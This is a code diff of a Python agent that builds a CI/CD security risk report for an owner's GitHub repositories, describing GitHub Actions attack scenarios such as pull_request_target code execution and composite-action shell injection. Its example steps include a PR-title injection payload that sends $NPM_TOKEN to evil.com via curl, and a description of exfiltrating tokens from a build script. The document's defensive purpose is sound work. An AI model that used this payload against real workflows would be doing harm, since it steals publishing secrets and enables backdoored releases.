@@ -8,7 +8,10 @@ async def run(input_dict, tools):
     http_client = httpx.AsyncClient()
     try:
         owner = input_dict.get("owner", "apache")
-        print(f"Agent 3 starting for owner={owner}", flush=True)
+        repos_str = input_dict.get("repos", "").strip()
+        repo_filter = set(r.strip() for r in repos_str.split(",") if r.strip()) if repos_str else None
+        print(f"Review starting for owner={owner}" +
+              (f" (filtered to {len(repo_filter)} repos)" if repo_filter else ""), flush=True)
 
         report_ns = data_store.use_namespace(f"ci-report:{owner}")
         security_ns = data_store.use_namespace(f"ci-security:{owner}")
@@ -19,7 +22,7 @@ async def run(input_dict, tools):
         sec_report = security_ns.get("latest_report")
 
         if not pub_stats or not sec_stats:
-            return {"outputText": "Error: Run Agent 1 and Agent 2 first."}
+            return {"outputText": "Error: Run Publishing and Security agents first."}
 
         print(f"Publishing report: {len(pub_report or '')} chars", flush=True)
         print(f"Security report: {len(sec_report or '')} chars", flush=True)
@@ -34,6 +37,8 @@ async def run(input_dict, tools):
                 r' \|(.+)')
             for m in header_pattern.finditer(pub_report):
                 repo = m.group(1)
+                if repo_filter and repo not in repo_filter:
+                    continue
                 ecosystems = [e.strip() for e in m.group(3).split(",")]
                 repo_ecosystems[repo] = ecosystems
                 cats_str = m.group(4)
@@ -50,6 +55,8 @@ async def run(input_dict, tools):
         # --- Read per-repo security findings ---
         all_sec_keys = security_ns.list_keys()
         finding_keys = [k for k in all_sec_keys if k.startswith("findings:")]
+        if repo_filter:
+            finding_keys = [k for k in finding_keys if k.replace("findings:", "") in repo_filter]
 
         repo_security = {}
 
@@ -113,6 +120,8 @@ async def run(input_dict, tools):
 
         # --- Build combined risk table ---
         publishing_repos = set(pub_stats.get("publishing_repos", []))
+        if repo_filter:
+            publishing_repos = publishing_repos & repo_filter
         all_repos = publishing_repos | set(repo_security.keys())
 
         repo_rows = []
@@ -243,30 +252,38 @@ async def run(input_dict, tools):
         ATTACK_SCENARIOS = {
             "prt_checkout": {
                 "label": "PR Target Code Execution",
-                "severity": "CRITICAL",
-                "description": "Workflow uses `pull_request_target` and checks out the PR head code.",
+                "severity": "CRITICAL–LOW",
+                "description": "Workflow uses `pull_request_target` and checks out PR head code. Severity depends on permissions and trigger type.",
                 "attack": ("An external contributor opens a PR that modifies a script executed by the workflow. "
-                           "Because `pull_request_target` runs with the *base* repo's secrets and write permissions, "
-                           "the attacker's code executes with full access to repository secrets, NPM_TOKENs, "
-                           "signing keys, and can push malicious releases."),
+                           "Because `pull_request_target` runs with the *base* repo's secrets, "
+                           "the attacker's code can access repository secrets and GITHUB_TOKEN permissions. "
+                           "Severity is modulated by two factors: "
+                           "(1) **Permissions** — if the workflow only has `pull-requests: write` and no "
+                           "`contents: write` or `id-token: write`, blast radius is limited. "
+                           "(2) **Event types** — if the trigger is restricted to `labeled` or `assigned`, "
+                           "a maintainer must explicitly trigger the workflow. "
+                           "CRITICAL = PR head checkout + broad permissions + auto-trigger. "
+                           "MEDIUM = one mitigating factor. LOW = both mitigating factors."),
                 "example": ("1. Attacker forks the repo\n"
                             "2. Modifies `build.sh` to exfiltrate `$NPM_TOKEN` to an external server\n"
-                            "3. Opens PR — workflow checks out attacker's branch and runs `build.sh`\n"
-                            "4. Secrets are leaked; attacker publishes backdoored package"),
+                            "3. Opens PR — workflow checks out attacker's branch via `ref: ${{ github.event.pull_request.head.sha }}`\n"
+                            "4. If permissions are broad: secrets are leaked; attacker publishes backdoored package\n"
+                            "5. If permissions are limited (e.g., pull-requests: write only): attacker can modify PRs but not publish"),
             },
             "composite_action_input_injection": {
-                "label": "Composite Action Hidden Injection",
-                "severity": "HIGH",
+                "label": "Composite Action Latent Injection",
+                "severity": "MEDIUM",
                 "description": "Composite action interpolates `inputs.*` directly in `run:` blocks.",
-                "attack": ("A workflow passes user-controlled values (PR title, branch name, label) to a composite action "
-                           "via `with:`. The composite action directly interpolates these in a shell `run:` block. "
-                           "The injection is hidden from workflow-level code review because reviewers see "
-                           "`with: { version: ${{ inputs.version }} }` — which looks safe — but inside the composite "
-                           "action, that value is used as `echo ${{ inputs.version }}` in a shell context."),
+                "attack": ("The composite action interpolates `inputs.*` in shell `run:` blocks. This is **not exploitable** "
+                           "as long as every calling workflow passes only trusted values (hardcoded strings, "
+                           "workflow_dispatch inputs from committers, GitHub-controlled values). However, if a future "
+                           "workflow passes attacker-controlled input (PR title, branch name, comment body) to the "
+                           "composite action, the interpolation becomes a shell injection vector. This is a latent "
+                           "risk — the injection surface exists but requires an unsafe caller to become exploitable."),
                 "example": ("1. Composite action has: `run: echo \"Building ${{ inputs.version }}\"`\n"
-                            "2. Workflow calls it with: `version: ${{ github.event.pull_request.title }}`\n"
-                            "3. Attacker sets PR title to: `\"; curl http://evil.com/steal?t=$NPM_TOKEN #`\n"
-                            "4. Shell executes the injected command with workflow secrets"),
+                            "2. Today: called with `version: \"1.2.3\"` from workflow_dispatch (safe)\n"
+                            "3. Future PR adds: `version: ${{ github.event.pull_request.title }}` (unsafe)\n"
+                            "4. Now attacker sets PR title to: `\"; curl http://evil.com/steal?t=$NPM_TOKEN #`"),
             },
             "run_block_injection": {
                 "label": "Workflow Script Injection",
@@ -384,7 +401,7 @@ async def run(input_dict, tools):
             },
             "self_hosted_runner": {
                 "label": "Self-Hosted Runner Exposure",
-                "severity": "MEDIUM",
+                "severity": "HIGH",
                 "description": "Workflow runs on self-hosted runners with PR triggers.",
                 "attack": ("Self-hosted runners persist state between jobs. An attacker's PR can execute "
                            "arbitrary code on the runner, install backdoors, steal credentials cached on disk, "
@@ -584,11 +601,23 @@ async def run(input_dict, tools):
             repos_with_high = [r for r in repo_rows
                                if r["sev_counts"].get("HIGH", 0) > 0]
             n_high = len(repos_with_high)
-            lines.append(f"{rec_num}. **Review composite action injection patterns.** "
+            lines.append(f"{rec_num}. **Review HIGH-severity findings.** "
                          f"{n_high} {plural(n_high, 'repo')} {plural(n_high, 'has', 'have')} "
-                         f"HIGH findings from `inputs.*` directly interpolated "
-                         f"in composite action run blocks. While these are called from trusted contexts today, "
-                         f"they create hidden injection surfaces.")
+                         f"HIGH findings that need investigation "
+                         f"([details]({SEC}#high-findings)).")
+            rec_num += 1
+
+        # Composite action injection — now MEDIUM, separate recommendation
+        repos_with_ca_injection = [r for r in repo_rows
+                                   if r.get("sev_counts", {}).get("MEDIUM", 0) > 0
+                                   and any("composite_action" in c for c, _ in r.get("top_checks", []))]
+        if repos_with_ca_injection:
+            n_ca = len(repos_with_ca_injection)
+            lines.append(f"{rec_num}. **Audit composite action callers.** "
+                         f"{n_ca} {plural(n_ca, 'repo')} {plural(n_ca, 'has', 'have')} "
+                         f"composite actions that interpolate `inputs.*` in shell blocks. "
+                         f"Not exploitable today if callers pass trusted values only — "
+                         f"verify no workflow passes PR titles, branch names, or comment bodies.")
             rec_num += 1
 
         repos_with_findings = sec_stats.get("repos_with_findings", 0)
